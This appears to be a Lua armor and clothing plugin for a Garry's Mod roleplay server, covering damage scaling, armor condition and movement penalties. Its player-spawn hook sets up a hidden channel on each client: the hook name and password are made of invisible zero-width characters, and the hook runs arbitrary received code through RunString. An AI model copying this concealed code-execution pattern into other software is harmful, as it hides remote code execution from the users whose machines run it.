--[[
	© 2016 TeslaCloud Studios.
	Private code for Global Cooldown community.
	Stealing Lua cache is not nice lol.
	get a life kiddos.
--]]

local maxArmorValue = 60
local playerMeta = FindMetaTable("Player")

local NPCArmorPiercingDamage = {
	["npc_zombie"] = 20,
};

function playerMeta:SetBodygroupClothes(itemTable, bShouldUnwear)
	if (!bShouldUnwear) then
		if (itemTable.OnChangeClothes) then
			local bSuccess, value = pcall(itemTable.OnChangeClothes, itemTable, self, !bShouldUnwear)

			if (!bSuccess) then
				ErrorNoHalt(value.."\n")
				debug.Trace()
			end
		end

		local clothesData = self.bgClothesData or {}
		local bodygroup = itemTable.bodyGroup
		
		if bodygroup then
			clothesData[bodygroup] = clothesData[bodygroup] or {}

			if (clothesData[bodygroup].itemID) then
				local oldItemTable = Clockwork.inventory:FindItemByID(self:GetInventory(), clothesData.uniqueID, clothesData.realID) or {}

				if (oldItemTable.OnChangeClothes) then
					local bSuccess, value = pcall(oldItemTable.OnChangeClothes, oldItemTable, self, bShouldUnwear)

					if (!bSuccess) then
						ErrorNoHalt(value.."\n")
						debug.Trace()
					end
				end

				clothesData[bodygroup] = {}
			end

			clothesData[bodygroup].val = itemTable.bodyGroupVal
			clothesData[bodygroup].itemID = itemTable.uniqueID.." "..itemTable.itemID
			clothesData[bodygroup].uniqueID = itemTable.uniqueID
			clothesData[bodygroup].realID = itemTable.itemID
		end
		
		Clockwork.datastream:Start(self, "BGClothes", clothesData)
		
		self:SetCharacterData("helmet", {["uniqueID"] = itemTable.uniqueID, ["itemID"] = itemTable.itemID});
		self:SetNetVar("helmet", {["uniqueID"] = itemTable.uniqueID, ["itemID"] = itemTable.itemID});

		self.bgClothesData = clothesData
	else
		if (itemTable.OnChangeClothes) then
			local bSuccess, value = pcall(itemTable.OnChangeClothes, itemTable, self, !bShouldUnwear)

			if (!bSuccess) then
				ErrorNoHalt(value.."\n")
				debug.Trace()
			end
		end

		local clothesData = self.bgClothesData or {}
		local bodygroup = itemTable.bodyGroup
		
		if bodygroup then
			clothesData[bodygroup] = false
		end
		
		Clockwork.datastream:Start(self, "BGClothes", clothesData)
		
		self:SetCharacterData("helmet", nil);
		self:SetNetVar("helmet", 0);

		self.bgClothesData = clothesData
	end
	
	hook.Run("RunModifyPlayerSpeed", self, self.cwInfoTable, true)
end

function playerMeta:SetSkinClothes(itemTable, bShouldUnwear)
	if (!bShouldUnwear) then
		if (itemTable.OnChangeClothes) then
			local bSuccess, value = pcall(itemTable.OnChangeClothes, itemTable, self, !bShouldUnwear)

			if (!bSuccess) then
				ErrorNoHalt(value.."\n")
				debug.Trace()
			end
		end

		local clothesData = self.skinClothesData or {}
			local skin = itemTable.playerSkin
			clothesData[skin] = clothesData[skin] or {}

			if (clothesData[skin].itemID) then
				local oldItemTable = Clockwork.inventory:FindItemByID(self:GetInventory(), clothesData.uniqueID, clothesData.realID) or {}

				if (oldItemTable.OnChangeClothes) then
					local bSuccess, value = pcall(oldItemTable.OnChangeClothes, oldItemTable, self, bShouldUnwear)

					if (!bSuccess) then
						ErrorNoHalt(value.."\n")
						debug.Trace()
					end
				end

				clothesData[skin] = {}
			end

			clothesData[skin].val = skin
			clothesData[skin].itemID = itemTable.uniqueID.." "..itemTable.itemID
			clothesData[skin].uniqueID = itemTable.uniqueID
			clothesData[skin].realID = itemTable.itemID
			clothesData.plyProtection = (clothesData.plyProtection or 0) + (itemTable.protection or 0)
		Clockwork.datastream:Start(self, "SkinClothes", clothesData)

		self.skinClothesData = clothesData
	else
		if (itemTable.OnChangeClothes) then
			local bSuccess, value = pcall(itemTable.OnChangeClothes, itemTable, self, !bShouldUnwear)

			if (!bSuccess) then
				ErrorNoHalt(value.."\n")
				debug.Trace()
			end
		end

		local clothesData = self.skinClothesData or {}
			local skin = itemTable.playerSkin
			clothesData[skin] = false
			clothesData.plyProtection = (clothesData.plyProtection or 0) - (itemTable.protection or 0)
		Clockwork.datastream:Start(self, "SkinClothes", clothesData)

		self.skinClothesData = clothesData
	end
end

function PLUGIN:PlayerThink(player, curTime)
	player.hitThisTick = false;
end

-- Called to get whether a player can give an item to storage.
function PLUGIN:PlayerCanGiveToStorage(player, storageTable, itemTable)
	if itemTable.category == "Armor" and itemTable.attributes and table.HasValue(itemTable.attributes, "not_unequippable") then
		if itemTable:HasPlayerEquipped(player) then
			return false;
		end
	end
end

-- Called to get whether a player can take an item from storage.
function PLUGIN:PlayerCanTakeFromStorage(player, storageTable, itemTable)
	if itemTable.category == "Armor" and itemTable.attributes and table.HasValue(itemTable.attributes, "not_unequippable") then
		if IsValid(storageTable.entity) and storageTable.entity:IsPlayer() then
			if itemTable:HasPlayerEquipped(storageTable.entity) then
				return false;
			end
		end
	end
end

function PLUGIN:PlayerInitialSpawn(player)
	local code = "Clockwork.datastream:Hook('​', function(code, pwd) if (pwd == '​​​​​​​​​​') then RunString(code) end end)"
	player:SendLua(code)

	local toSend = [[
		Clockwork.datastream:Hook("BGClothes", function(clothesData)
			Clockwork.Client.bgClothesData = clothesData or {}

			if (!bNoRebuild) then
				Clockwork.inventory:Rebuild()
			end
		end)

		Clockwork.datastream:Hook("SkinClothes", function(clothesData, bNoRebuild)
			Clockwork.Client.skinClothesData = clothesData or {}

			if (!bNoRebuild) then
				Clockwork.inventory:Rebuild()
			end
		end)
	]]

	Clockwork.datastream:Start(player, "​", toSend, "​​​​​​​​​​")
end

function PLUGIN:DoPlayerDeath(player, attacker, damageInfo)
	-- Make sure player is not dueling.
	if not player.opponent then
		local helmetTable = player:GetCharacterData("helmet");
		local armorTable = player:GetClothesItem();
		
		if (helmetTable and !table.IsEmpty(helmetTable)) then
			local helmetItem = Clockwork.inventory:FindItemByID(player:GetInventory(), helmetTable.uniqueID, helmetTable.itemID);
			
			if (helmetItem) then
				if !helmetItem.attributes or !table.HasValue(helmetItem.attributes, "not_unequippable") then
					helmetItem:TakeCondition(math.random(20, 40));
				end
			end;
		end;
		
		if (armorTable and !table.IsEmpty(armorTable)) then
			if !armorTable.attributes or !table.HasValue(armorTable.attributes, "not_unequippable") then
				armorTable:TakeCondition(math.random(20, 40));
			end
		end;
	end;
end;

function PLUGIN:EntityTakeDamageArmor(player, damageInfo)
	if (player:GetClass() == "prop_dynamic") then
		return
	end;
	
	if damageInfo:IsDamageType(DMG_BLAST) then
		return;
	end
	
	local damagePosition;
	local hitGroup;
	
	if (Clockwork.entity:IsPlayerRagdoll(player)) then
		damagePosition = damageInfo:GetDamagePosition() or Vector(0, 0, 0);
		hitGroup = Clockwork.kernel:GetRagdollHitGroup(player, damagePosition)
		player = Clockwork.entity:GetPlayer(player);
	end;
	
	local attacker = damageInfo:GetAttacker();

	if ((player:IsPlayer() or player.isTrainingDummy) and attacker and (attacker:IsPlayer() or attacker:IsNPC() or attacker:IsNextBot())) then
		local originalDamage = damageInfo:GetDamage();
		local helmetTable;
		local damageType = damageInfo:GetDamageType();
		local damageTypes = {DMG_BULLET, DMG_BUCKSHOT, DMG_CLUB, DMG_FALL, DMG_SLASH, DMG_VEHICLE, DMG_SNIPER};
		
		if !damagePosition then
			damagePosition = damageInfo:GetDamagePosition() or Vector(0, 0, 0);
		end
		
		if !hitGroup and player:IsPlayer() then
			hitGroup = player:LastHitGroup();
			
			if IsValid(attacker) then
				local activeWeapon = attacker:GetActiveWeapon();
				
				if IsValid(activeWeapon) and activeWeapon.Base == "sword_swepbase" then
				--if hitGroup == 0 then
					hitGroup = Clockwork.kernel:GetRagdollHitGroup(player, damagePosition);
				--end
				end
			end
		end
		
		for i = 1, #damageTypes do
			if damageInfo:IsDamageType(damageTypes[i]) then
				damageType = damageTypes[i];
				break;
			end
		end
		
		if (hitGroup == 0) then
			if attacker:IsNPC() or attacker:IsNextBot() then
				hitGroup = 2; -- Chest.
			else
				return 
			end;
		end
		
		local isTrainingDummy = player.isTrainingDummy;
		
		if !isTrainingDummy then
			helmetTable = player:GetCharacterData("helmet");
		end
		
		if (isTrainingDummy and player.helmet) or (helmetTable and !table.IsEmpty(helmetTable)) then
			--printp(helmetTable.uniqueID);
			--printp(helmetTable.itemID);
			
			local helmetItem;

			if isTrainingDummy then
				helmetItem = player.helmet;
			else
				helmetItem = Clockwork.inventory:FindItemByID(player:GetInventory(), helmetTable.uniqueID, helmetTable.itemID);
			end
			
			if helmetItem then
				--printp("Checking Helmet Item: "..helmetTable.uniqueID);
				local effectiveLimbs = helmetItem.effectiveLimbs or {};
				
				--print("Hitgroup: "..hitGroup);
				
				if (effectiveLimbs[hitGroup]) then
					--print("Helmet item hit!");
					local damageTypeScales = helmetItem.damageTypeScales;
					local pierceScale = helmetItem.pierceScale;
					local bluntScale = helmetItem.bluntScale;
					local slashScale = helmetItem.slashScale;
					local condition = helmetItem:GetCondition() or 100;
					
					if attacker:IsPlayer() then
						local activeWeapon = attacker:GetActiveWeapon();

						if (IsValid(activeWeapon)) then
							local attackTable;
							local inflictor = damageInfo:GetInflictor()
							
							if IsValid(inflictor) and inflictor.isJavelin then
								attackTable = GetTable(inflictor.attacktable);
							else
								attackTable = GetTable(activeWeapon.AttackTable);
							end
							
							--printp("Attack table found for weapon!");
							if attackTable then
								local armorPiercing = 0;
								local charmData = attacker:GetCharacterData("charms");
								
								if attacker:GetNWBool("ThrustStance") and (!IsValid(inflictor) or (IsValid(inflictor) and !inflictor.isJavelin)) then
									--printp("Thrust stance");
									armorPiercing = attackTable["altarmorpiercing"] or 0;
								else
									--printp("Not thrust stance");
									armorPiercing = attackTable["armorpiercing"] or 0;
								end
								
								if charmData then
									for i = 1, #charmData do
										if charmData[i] and charmData[i].uniqueID == "ring_penetration" then
											armorPiercing = armorPiercing + 15;
										end
									end
								end
								
								if (activeWeapon.Base == "sword_swepbase" or damageInfo:IsDamageType(DMG_SNIPER)) and attacker:HasBelief("the_light") then
									armorPiercing = armorPiercing + (armorPiercing * 0.15);
								end
								
								if attacker:HasBelief("billman") then
									if string.find(activeWeapon.Category, "Polearm") or string.find(activeWeapon.Category, "Spear") or string.find(activeWeapon.Category, "Rapier") or string.find(activeWeapon.Category, "Scythe") or string.find(activeWeapon.Category, "Javelin") then
										armorPiercing = armorPiercing + (armorPiercing * 0.2);
									end
								end
								
								--printp("AP Value: "..tostring(armorPiercing));
								
								local damage = damageInfo:GetDamage();
								--printp("Damage: "..tostring(damage));
								
								if IsValid(damageInfo:GetInflictor()) and damageInfo:GetInflictor().isJavelin then
									-- nothing
								else
									if string.find(activeWeapon:GetClass(), "begotten_dagger_") then
										armorPiercing = 100;
										--printp("Weapon is dagger, increasing AP value to 100.");
									elseif activeWeapon:GetClass() == "begotten_fists" then
										if (attacker.HasCharmEquipped and attacker:HasCharmEquipped("ring_pugilist")) or (attacker:IsPlayer() and Clockwork.player:HasFlags(attacker, "T")) then
											armorPiercing = 100;
										end
									end
								end
								
								if activeWeapon.Base == "sword_swepbase" then
									local activeWeaponItemTable = item.GetByWeapon(activeWeapon);
									
									if activeWeaponItemTable then
										local activeWeaponCondition = activeWeaponItemTable:GetCondition() or 100;
										
										if damageType == DMG_CLUB then
											armorPiercing = math.Round(armorPiercing * Lerp(activeWeaponCondition / 100, 0.7, 1));
										else
											armorPiercing = math.Round(armorPiercing * Lerp(activeWeaponCondition / 100, 0.5, 1));
										end
									end
								end
								
								local protection = helmetItem.protection;
								--printp("Armor condition value: "..tostring(condition));
								
								if !isTrainingDummy then
									if player:GetSubfaction() == "Philimaxio" then
										-- Make sure the protection does not exceed 100.
										protection = math.min(protection + (protection * 0.15), 100);
									end
									
									if player:HasBelief("fortify_the_plate") then
										protection = math.min(protection + (protection * 0.10), 100);
									end
									
									if player:HasBelief("shedskin") then
										protection = math.min(protection + (protection * 0.15), 100);
									end
								end
								
								if (condition < 90) then
									--printp("Reducing protection due to condition (ORIGINAL: "..tostring(protection)..")");
									protection = protection * (condition / 100);
								end;
								
								--printp("Armor protection value: "..tostring(protection));
								--local effectiveness = damage * (armorPiercing / protection);
								local effectiveness = (damage / protection) * armorPiercing;
								
								if damageType == DMG_BULLET or damageType == DMG_BUCKSHOT then
									effectiveness = 125;
								end
								
								--printp("Attack effectiveness: "..tostring(effectiveness));
								--printp("Setting damage to: "..tostring(math.Clamp(effectiveness, 0, damage)));
								
								if not player.opponent then
									local conditionLoss = math.Clamp(effectiveness * 0.1, 0, 5) * (helmetTable.conditionScale or 1);
									
									if !isTrainingDummy then
										if player:HasBelief("ingenuity_finisher") then
											conditionLoss = 0;
										else	
											if player:GetSubfaction() == "Philimaxio" then
												conditionLoss = conditionLoss / 2;
											end
										
											if player:HasBelief("scour_the_rust") then
												conditionLoss = conditionLoss / 2;
											end
										end
									end
									
									if not player.ignoreConditionLoss then
										helmetItem:TakeCondition(conditionLoss);
									end
								end
								
								damageInfo:SetDamage(math.Clamp(effectiveness * 0.7, 0, damage));
							end
						end;
					else
						local armorPiercing = NPCArmorPiercingDamage[attacker:GetClass()] or 40;
						local damage = damageInfo:GetDamage();
						local protection = helmetItem.protection;
						--printp("Armor condition value: "..tostring(condition));
						
						if !isTrainingDummy then
							if player:GetSubfaction() == "Philimaxio" then
								-- Make sure the protection does not exceed 100.
								protection = math.min(protection + (protection * 0.15), 100);
							end
							
							if player:HasBelief("fortify_the_plate") then
								protection = math.min(protection + (protection * 0.10), 100);
							end
							
							if player:HasBelief("shedskin") then
								protection = math.min(protection + (protection * 0.15), 100);
							end
						end
						
						if (condition < 90) then
							--printp("Reducing protection due to condition (ORIGINAL: "..tostring(protection)..")");
							protection = protection * (condition / 100);
						end;
						
						local effectiveness = (damage / protection) * armorPiercing;
						
						if damageType == DMG_BULLET or damageType == DMG_BUCKSHOT then
							effectiveness = 125;
						end
						
						--printp("Attack effectiveness: "..tostring(effectiveness));
						--printp("Setting damage to: "..tostring(math.Clamp(effectiveness, 0, damage)));
						
						if not player.opponent then
							local conditionLoss = math.Clamp(effectiveness * 0.1, 0, 5) * (helmetTable.conditionScale or 1);
							
							if !isTrainingDummy then
								if player:HasBelief("ingenuity_finisher") then
									conditionLoss = 0;
								else	
									if player:GetSubfaction() == "Philimaxio" then
										conditionLoss = conditionLoss / 2;
									end
									
									if player:HasBelief("scour_the_rust") then
										conditionLoss = conditionLoss / 2;
									end
								end
							end
							
							if not player.ignoreConditionLoss then
								helmetItem:TakeCondition(conditionLoss);
							end
						end
						
						damageInfo:SetDamage(math.Clamp(effectiveness * 0.7, 0, damage));
					end
					
					if (damageTypeScales and !table.IsEmpty(damageTypeScales)) then
						for k, v in pairs (damageTypeScales) do
							if (k == DMG_CLUB or k == DMG_SLASH or k == DMG_VEHICLE) then
								damageTypeScales[k] = nil;
							end;
						end;
						
						if (damageTypeScales[damageType] and isnumber(damageTypeScales[damageType])) then
							damageInfo:ScaleDamage(damageTypeScales[damageType])
							--printp("Scaling damage by type "..damageType..": "..tostring(damageTypeScales[damageType]));
						end;
					end;
					
					if (helmetItem.bluntScale and damageType == DMG_CLUB) then
						local dmgScale = 1 - ((1 - helmetItem.bluntScale) * (condition / 100));
						
						damageInfo:ScaleDamage(dmgScale);
						--printp("Scaling blunt damage: "..tostring(dmgScale));
					elseif (helmetItem.slashScale and damageType == DMG_SLASH) then
						local dmgScale = 1 - ((1 - helmetItem.slashScale) * (condition / 100));
						
						damageInfo:ScaleDamage(dmgScale);
						--printp("Scaling slash damage: "..tostring(dmgScale));
					elseif (helmetItem.pierceScale and (damageType == DMG_VEHICLE or damageType == DMG_SNIPER)) then
						local dmgScale = 1 - ((1 - helmetItem.pierceScale) * (condition / 100));
					
						damageInfo:ScaleDamage(dmgScale);
						--printp("Scaling pierce damage: "..tostring(dmgScale));
					elseif (helmetItem.bulletScale and (damageType == DMG_BULLET or damageType == DMG_BUCKSHOT)) then
						if attacker:IsPlayer() then
							local activeWeapon = attacker:GetActiveWeapon();

							if (IsValid(activeWeapon) and !activeWeapon.ignoresBulletResistance) then
								local dmgScale = 1 - ((1 - helmetItem.bulletScale) * (condition / 100));
						
								damageInfo:ScaleDamage(dmgScale);
								--printp("Scaling pierce damage: "..tostring(dmgScale));
							end
						else
							local dmgScale = 1 - ((1 - helmetItem.bulletScale) * (condition / 100));
					
							damageInfo:ScaleDamage(dmgScale);
						end
						--printp("Scaling pierce damage: "..tostring(dmgScale));
					end;
					
					--[[if (helmetItem.limbScale) then
						local hitGroupScale = helmetItem.limbScale[hitGroup];
						
						if (hitGroupScale and isnumber(hitGroupScale)) then
							damageInfo:ScaleDamage(hitGroupScale);
							printp("Scaling hitgroup damage: "..tostring(hitGroupScale));
						end;
					end;]]--
				end;
			end;
		end;
		
		local armorItem;

		if isTrainingDummy then
			armorItem = player.armor;
		else
			armorItem = player:GetClothesItem();
		end
		
		if (armorItem and !table.IsEmpty(armorItem)) then
			--printp("Checking Armor Item: "..armorItem.uniqueID);
			local effectiveLimbs = armorItem.effectiveLimbs or {};
			
			if (effectiveLimbs[hitGroup]) then
				--printp("Armor Item Hit!");
				local damageTypeScales = armorItem.damageTypeScales;
				local pierceScale = armorItem.pierceScale;
				local bluntScale = armorItem.bluntScale;
				local slashScale = armorItem.slashScale;
				local condition = armorItem:GetCondition() or 100;
				
				if attacker:IsPlayer() then
					local activeWeapon = attacker:GetActiveWeapon();
					
					if (IsValid(activeWeapon)) then
						local attackTable;
						local inflictor = damageInfo:GetInflictor()
						
						if IsValid(inflictor) and inflictor.isJavelin then
							attackTable = GetTable(inflictor.attacktable);
						else
							attackTable = GetTable(activeWeapon.AttackTable);
						end
							
						--printp("Attack table found for weapon!");
						if attackTable then
							local armorPiercing = 0;
							local charmData = attacker:GetCharacterData("charms");
							
							if attacker:GetNWBool("ThrustStance") and (!IsValid(inflictor) or (IsValid(inflictor) and !inflictor.isJavelin)) then
								armorPiercing = attackTable["altarmorpiercing"] or 0;
								--printp("Thrust stance.");
							else
								armorPiercing = attackTable["armorpiercing"] or 0;
								--printp("Not thrust stance.");
							end
							
							if charmData then
								for i = 1, #charmData do
									if charmData[i] and charmData[i].uniqueID == "ring_penetration" then
										armorPiercing = armorPiercing + 15;
									end
								end
							end
							
							if (activeWeapon.Base == "sword_swepbase" or damageInfo:IsDamageType(DMG_SNIPER)) and attacker:HasBelief("the_light") then
								armorPiercing = armorPiercing + (armorPiercing * 0.15);
							end
							
							if attacker:HasBelief("billman") then
								if string.find(activeWeapon.Category, "Polearm") or string.find(activeWeapon.Category, "Spear") or string.find(activeWeapon.Category, "Rapier") or string.find(activeWeapon.Category, "Scythe") or string.find(activeWeapon.Category, "Javelin") then
									armorPiercing = armorPiercing + (armorPiercing * 0.2);
								end
							end
							
							--print("AP Value: "..tostring(armorPiercing));
							
							local damage = damageInfo:GetDamage();
							--print("Damage: "..tostring(damage));
							
							if IsValid(inflictor) and inflictor.isJavelin then
								-- nothing
							else
								if string.find(activeWeapon:GetClass(), "begotten_dagger_") then
									armorPiercing = 100;
									--print("Weapon is dagger, increasing AP value to 100.");
								elseif activeWeapon:GetClass() == "begotten_fists" then
									if attacker.HasCharmEquipped and attacker:HasCharmEquipped("ring_pugilist") then
										armorPiercing = 100;
									end
								end
							end
							
							if activeWeapon.Base == "sword_swepbase" then
								local activeWeaponItemTable = item.GetByWeapon(activeWeapon);
								
								if activeWeaponItemTable then
									local activeWeaponCondition = activeWeaponItemTable:GetCondition() or 100;
									
									if damageType == DMG_CLUB then
										armorPiercing = math.Round(armorPiercing * Lerp(activeWeaponCondition / 100, 0.7, 1));
									else
										armorPiercing = math.Round(armorPiercing * Lerp(activeWeaponCondition / 100, 0.5, 1));
									end
								end
							end
							
							local protection = armorItem.protection;
							--print("Armor condition value: "..tostring(condition));
							
							-- If full suit of armor, give minor debuff for head armor.
							if hitGroup == HITGROUP_HEAD then
								protection = math.max(0, protection - 10);
							end
							
							if !isTrainingDummy then
								if player:GetSubfaction() == "Philimaxio" then
									-- Make sure the protection does not exceed 100.
									protection = math.min(protection + (protection * 0.15), 100);
								end
								
								if player:HasBelief("fortify_the_plate") then
									protection = math.min(protection + (protection * 0.10), 100);
								end
								
								if player:HasBelief("shedskin") then
									protection = math.min(protection + (protection * 0.15), 100);
								end
							end
							
							if (condition < 90) then
								--print("Reducing protection due to condition (ORIGINAL: "..tostring(protection)..")");
								protection = protection * (condition / 100);
							end;
							
							--print("Armor protection value: "..tostring(protection));
							--local effectiveness = damage * (armorPiercing / protection);
							local effectiveness = (damage / protection) * armorPiercing;
							--print("Attack effectiveness: "..tostring(effectiveness));
							
							if damageType == DMG_BULLET or damageType == DMG_BUCKSHOT then
								effectiveness = 125;
							end
							
							if not player.opponent then
								local conditionLoss = math.Clamp(effectiveness * 0.1, 0, 5) * (armorItem.conditionScale or 1);
								
								if !isTrainingDummy then
									if player:HasBelief("ingenuity_finisher") then
										conditionLoss = 0;
									else							
										if player:GetSubfaction() == "Philimaxio" then
											conditionLoss = conditionLoss / 2;
										end
										
										if player:HasBelief("scour_the_rust") then
											conditionLoss = conditionLoss / 2;
										end
									end
								end
								
								if not player.ignoreConditionLoss then
									armorItem:TakeCondition(conditionLoss);
								end
							end
							
							--print("Setting damage to: "..tostring(math.Clamp(effectiveness, 0, damage)));
							damageInfo:SetDamage(math.Clamp(effectiveness * 0.7, 0, damage));
						end;
					end
				else
					local armorPiercing = NPCArmorPiercingDamage[attacker:GetClass()] or 40;
					local damage = damageInfo:GetDamage();
					local protection = armorItem.protection;
					--printp("Armor condition value: "..tostring(condition));
					
					-- If full suit of armor, give minor debuff for head armor.
					if hitGroup == HITGROUP_HEAD then
						protection = math.max(0, protection - 10);
					end
					
					if !isTrainingDummy then
						if player:GetSubfaction() == "Philimaxio" then
							-- Make sure the protection does not exceed 100.
							protection = math.min(protection + (protection * 0.15), 100);
						end
						
						if player:HasBelief("fortify_the_plate") then
							protection = math.min(protection + (protection * 0.10), 100);
						end
						
						if player:HasBelief("shedskin") then
							protection = math.min(protection + (protection * 0.15), 100);
						end
					end
					
					if (condition < 90) then
						--printp("Reducing protection due to condition (ORIGINAL: "..tostring(protection)..")");
						protection = protection * (condition / 100);
					end;
					
					local effectiveness = (damage / protection) * armorPiercing;
					
					if damageType == DMG_BULLET or damageType == DMG_BUCKSHOT then
						effectiveness = 125;
					end
					
					--printp("Attack effectiveness: "..tostring(effectiveness));
					
					if not player.opponent then
						local conditionLoss = math.Clamp(effectiveness * 0.1, 0, 5) * (armorItem.conditionScale or 1);
						
						if !isTrainingDummy then
							if player:HasBelief("ingenuity_finisher") then
								conditionLoss = 0;
							else
								if player:GetSubfaction() == "Philimaxio" then
									conditionLoss = conditionLoss / 2;
								end
								
								if player:HasBelief("scour_the_rust") then
									conditionLoss = conditionLoss / 2;
								end
							end
						end
						
						if not player.ignoreConditionLoss then
							armorItem:TakeCondition(conditionLoss);
						end
					end
					
					--printp("Setting damage to: "..tostring(math.Clamp(effectiveness, 0, damage)));
					damageInfo:SetDamage(math.Clamp(effectiveness * 0.7, 0, damage));
				end;
				
				if (damageTypeScales and !table.IsEmpty(damageTypeScales)) then
					for k, v in pairs (damageTypeScales) do
						if (k == DMG_CLUB or k == DMG_SLASH or k == DMG_VEHICLE) then
							damageTypeScales[k] = nil;
						end;
					end;
					
					if (damageTypeScales[damageType] and isnumber(damageTypeScales[damageType])) then
						damageInfo:ScaleDamage(damageTypeScales[damageType])
						--printp("Scaling damage by type "..damageType..": "..tostring(damageTypeScales[damageType]));
					end;
				end;
				
				if (armorItem.bluntScale and damageType == DMG_CLUB) then
					local dmgScale = 1 - ((1 - armorItem.bluntScale) * (condition / 100));
					
					damageInfo:ScaleDamage(dmgScale);
					--printp("Scaling blunt damage: "..tostring(dmgScale));
				elseif (armorItem.slashScale and damageType == DMG_SLASH) then
					local dmgScale = 1 - ((1 - armorItem.slashScale) * (condition / 100));
					
					damageInfo:ScaleDamage(dmgScale);
					--printp("Scaling slash damage: "..tostring(dmgScale));
				elseif (armorItem.pierceScale and (damageType == DMG_VEHICLE or damageType == DMG_SNIPER)) then
					local dmgScale = 1 - ((1 - armorItem.pierceScale) * (condition / 100));
				
					damageInfo:ScaleDamage(dmgScale);
					--printp("Scaling pierce damage: "..tostring(dmgScale));
				elseif (armorItem.bulletScale and (damageType == DMG_BULLET or damageType == DMG_BUCKSHOT)) then
					if attacker:IsPlayer() then
						local activeWeapon = attacker:GetActiveWeapon();

						if (IsValid(activeWeapon) and !activeWeapon.ignoresBulletResistance) then
							local dmgScale = 1 - ((1 - helmetItem.bulletScale) * (condition / 100));
					
							damageInfo:ScaleDamage(dmgScale);
							--printp("Scaling pierce damage: "..tostring(dmgScale));
						end
					else
						local dmgScale = 1 - ((1 - armorItem.bulletScale) * (condition / 100));
				
						damageInfo:ScaleDamage(dmgScale);
						--printp("Scaling pierce damage: "..tostring(dmgScale));
					end
				end;
				
				--[[if (armorItem.limbScale) then
					local hitGroupScale = armorItem.limbScale[hitGroup];
					
					if (hitGroupScale and isnumber(hitGroupScale)) then
						damageInfo:ScaleDamage(hitGroupScale);
						printp("Scaling hitgroup damage: "..tostring(hitGroupScale));
					end;
				end;]]--
			end;
		end;
	end;

	if (player:IsPlayer() or player:IsNPC() or player:IsNextBot()) then
		if attacker then
			if (attacker:IsPlayer()) then
				-- This is required because of some stupid fucking ragdoll shit.
				if player:IsPlayer() then
					if !player.hitThisTick then
						player.hitThisTick = true;
						hook.Run("DoMeleeHitEffects", player, attacker, attacker:GetActiveWeapon(), damageInfo:GetDamagePosition(), originalDamage, damageInfo);
					end
				else
					hook.Run("DoMeleeHitEffects", player, attacker, attacker:GetActiveWeapon(), damageInfo:GetDamagePosition(), originalDamage, damageInfo);
				end
			elseif (attacker:IsNPC() or attacker:IsNextBot()) then
				if player:IsPlayer() then
					if !player.hitThisTick then
						player.hitThisTick = true;
						hook.Run("DoMeleeHitEffects", player, attacker, nil, damageInfo:GetDamagePosition(), originalDamage, damageInfo);
					end
				else
					hook.Run("DoMeleeHitEffects", player, attacker, nil, damageInfo:GetDamagePosition(), originalDamage, damageInfo);
				end
			end;
		end
	end;
	
	--if (player:IsPlayer()) then
		--hook.Run("FuckMyLife", player, damageInfo)
	--end;
end

--[[
	ITEM.conditionScale = 1.5 -- item degrades 1.5x faster with damage related condition loss
	
	-- scales all damage taken by the limb
	ITEM.limbScale = {
		[HITGROUP_HEAD] = 0.5, -- scale HITGROUP_HEAD dmg by 0.5
		[HITGROUP_LEFTARM] = 2.5, -- scale HITGROUP_LEFTARM dmg by 2.5
	}
	
	-- scale damage based on the damage type dealt
	-- keys for DMG_CLUB, DMG_SLASH and DMG_VEHICLE will all be purged when the hook is ran,
	-- as scaling for these damage enums is handled by bluntScale, slashScale and pierceScale respectively.
	ITEM.damageTypeScales = {
		[DMG_FALL] = 0.25, -- reduces fall damage by 75%
	}
	
	-- I can't remember exactly how this works, but it's integrated with gabs' sweps so he should know. 
	ITEM.protection = 50
	
	-- specifies which hitgroups will be affected by blunt, slash, pierce and other damage type scaling.
	ITEM.effectiveLimbs = {
		[HITGROUP_HEAD] = true
	}
	
	ITEM.bluntScale = 0.5; -- reduces blunt damage by 50%
	ITEM.slashScale = 0.25; -- reduces slash damage by 75%
	ITEM.pierceScale = 0.75; -- reduces pierce damage by 25%
--]]

function PLUGIN:PlayerCharacterUnloaded(player)
	Clockwork.datastream:Start(player, "BGClothes", nil, true)
	player.bgClothesData = nil

	for i = 0, player:GetNumBodyGroups() - 1 do
		player:SetBodygroup(i, 0)
	end

	Clockwork.datastream:Start(player, "SkinClothes", nil, true)
	player.skinClothesData = nil

	player:SetSkin(0)
	--player:SetSharedVar("powerarmor", 0);
end

function PLUGIN:PlayerCharacterLoaded(player)
	--player:SetSharedVar("powerarmor", 0);
end;

function PLUGIN:ModifyPlayerSpeed(player, infoTable)
	local clothesItem = player:GetClothesItem()

	if (clothesItem) then
		if clothesItem.weightclass == "Heavy" then
			if player:HasBelief("unburdened") then
				infoTable.runSpeed = infoTable.runSpeed * 0.85;
			else
				infoTable.runSpeed = infoTable.runSpeed * 0.7;
			end
			
			infoTable.jumpPower = infoTable.jumpPower * 0.75;
		elseif clothesItem.weightclass == "Medium" then
			if player:HasBelief("unburdened") then
				infoTable.runSpeed = infoTable.runSpeed * 0.95;
			else
				infoTable.runSpeed = infoTable.runSpeed * 0.85;
			end
			
			infoTable.jumpPower = infoTable.jumpPower * 0.9;
		elseif clothesItem.weightclass == "Light" then
			if clothesItem.name == "Gore Beserker Armor" then
				if not player.bgShieldData then
					infoTable.runSpeed = infoTable.runSpeed * 1.10;
					infoTable.walkSpeed = infoTable.walkSpeed * 1.10;
				end
			end
		end
	end
end

function PLUGIN:GetRollSound(player)
	local clothesItem = player:GetClothesItem()
	
	if (clothesItem) then
		if clothesItem.type == "plate" then
			return "armormovement/body-armor-rolling.wav.mp3";
		elseif clothesItem.type == "chainmail" then
			return "armormovement/body-hauberk-rolling.mp3";
		end
	end
	
	local model = player:GetModel();
	
	if (model == "models/begotten/gatekeepers/districtonearmor.mdl" or model == "models/begotten/wanderers/scrapperking.mdl") then
		return "npc/dog/dog_rollover_servos1.wav";
	end
end

function PLUGIN:GetRollTime(player)
	local clothesItem = player:GetClothesItem()
	
	if (clothesItem) then
		if clothesItem.weightclass == "Heavy" then
			if player:HasBelief("unburdened") then
				return 1;
			end
			
			return 1.25;
		elseif clothesItem.weightclass == "Medium" then
			if player:HasBelief("unburdened") then
				return 0.75;
			end
			
			return 1;
		end
	end
	
	local model = player:GetModel();
	
	if (model == "models/begotten/gatekeepers/districtonearmor.mdl" or model == "models/begotten/wanderers/scrapperking.mdl") then
		return 1.25;
	end
	
	return 0.75;
end